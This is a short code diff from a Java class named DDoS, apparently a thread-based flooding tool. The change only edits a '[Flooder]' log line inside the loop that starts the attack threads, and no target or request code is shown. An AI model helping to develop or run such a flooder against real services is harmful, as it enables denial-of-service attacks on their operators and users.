@@ -14,7 +14,7 @@ public class DDoS
 		Chocolat.println("Beginning attack with " + threads + " threads.");
 		for (int yiffff = 0; yiffff < threads; yiffff++)
 		{
-			 Chocolat.print("[Flooder] Threads: " + threads);
+			 Chocolat.println("[Flooder] Threads: " + yiffff);
 			 Executors.newSingleThreadExecutor().execute(new Runnable() {
 	     		    @SuppressWarnings("static-access")
 					@Override
